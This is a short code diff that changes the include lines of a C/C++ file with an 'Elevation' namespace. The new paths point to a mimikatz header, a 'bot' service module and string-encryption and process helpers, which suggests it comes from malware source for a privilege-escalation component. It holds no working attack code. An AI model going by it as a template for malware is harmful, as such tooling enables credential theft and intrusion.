@@ -1,7 +1,11 @@
-#include "core\core.h"
-#include "core\service.h"
-#include "core\debug.h"
-
+#include "../../../mimikatz/include/mimikatz/inc/LMCons.h"
+#include <WinSock2.h>
+#include "../../include/core/string_crypt.h"
+#include "../../../bot/include/service.h"
+#include "../../include/core/debug.h"
+#include "../../include/core/winapi_simple.h"
+#include "../../include/core/memory.h"
+#include "../../include/core/process.h"
 namespace Elevation
 {
 
